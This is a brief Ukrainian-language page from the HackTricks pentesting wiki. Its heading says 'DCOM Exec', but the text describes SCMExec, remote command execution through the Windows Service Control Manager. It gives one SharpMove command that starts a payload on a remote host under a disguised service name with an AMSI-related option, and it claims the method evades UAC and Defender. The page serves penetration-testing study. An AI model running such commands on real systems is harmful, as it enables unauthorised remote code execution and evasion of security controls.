# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** — це техніка виконання команд у віддалених системах за допомогою Service Control Manager (SCM) для створення служби, яка запускає команду. Цей метод може обходити деякі засоби контролю безпеки, такі як User Account Control (UAC) і Windows Defender.

## Інструменти

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Посилання

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
